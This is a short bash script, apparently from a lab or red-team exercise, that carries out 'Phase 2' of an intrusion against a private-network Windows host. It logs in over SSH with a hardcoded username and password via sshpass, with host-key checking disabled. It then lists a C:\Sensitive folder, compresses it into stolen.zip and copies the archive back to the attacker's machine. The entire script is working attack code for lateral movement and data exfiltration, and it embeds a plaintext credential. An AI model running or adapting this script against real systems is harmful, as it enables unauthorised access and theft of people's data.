#!/bin/bash

# Phase 2: Lateral Movement + Data Exfiltration

TARGET_IP="10.0.1.7"
USER="koshanian"
PASS="jfAtr0YG6LfXbs,"

echo ""
echo "[*] ============================================"
echo "[*] Phase 2: Lateral Movement & Data Exfiltration"
echo "[*] ============================================"
echo ""

echo "[*] Step 1: Lateral movement to Windows machine..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no $USER@$TARGET_IP "powershell whoami"

sleep 3

echo ""
echo "[*] Step 2: Discovering sensitive files..."
sshpass -p "$PASS" ssh $USER@$TARGET_IP "powershell Get-ChildItem C:\Sensitive"

sleep 3

echo ""
echo "[*] Step 3: Staging stolen data (compression)..."
sshpass -p "$PASS" ssh $USER@$TARGET_IP "powershell Compress-Archive -Path C:\Sensitive -DestinationPath C:\stolen.zip -Force"

sleep 3

echo ""
echo "[*] Step 4: Exfiltrating data back to attacker machine..."
sshpass -p "$PASS" scp $USER@$TARGET_IP:C:/stolen.zip .

sleep 2

echo ""
echo "[+] Exfiltration complete!"
echo "[+] Stolen file saved locally:"
ls stolen.zip

echo ""
echo "[+] Phase 2 attack finished."
